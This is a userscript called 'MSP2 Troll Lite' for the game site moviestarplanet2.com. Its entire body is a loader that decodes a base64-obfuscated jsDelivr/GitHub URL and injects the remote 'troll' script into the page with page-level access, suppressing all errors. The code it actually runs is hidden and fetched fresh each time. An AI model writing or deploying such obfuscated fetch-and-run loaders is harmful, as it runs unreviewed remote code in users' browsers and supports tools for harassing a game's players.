// ==UserScript==
// @name         MSP2 Troll Lite
// @description  MSP2 Troll
// @namespace    https://msp2play.pages.dev/
// @version      1.4
// @match        https://moviestarplanet2.com/
// @grant        GM_addElement
// @grant        unsafeWindow
// @inject-into  page
// @run-at       document-start
// ==/UserScript==
(function(){
var u=atob("aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2xvbWJhcmQwMDEvc29mdEByZWZzL2hlYWRzL21haW4vbXNwMi50cm9sbC5qcw=="),
    t=setInterval(function(){
      try{
        if(document.querySelector("canvas")){
          clearInterval(t);
          setTimeout(function(){
            try{
              if(typeof GM_addElement==="function"){
                GM_addElement(document.head||document.getElementsByTagName("head")[0]||document.documentElement,"script",{src:u+"?t="+Date.now(),type:"text/javascript"});
              }else{
                var s=document.createElement("script");
                s.type="text/javascript";
                s.src=u+"?t="+Date.now();
                (document.head||document.getElementsByTagName("head")[0]||document.documentElement).appendChild(s);
              }
            }catch(e){}
          },5000);
        }
      }catch(e){}
    },500);
})();
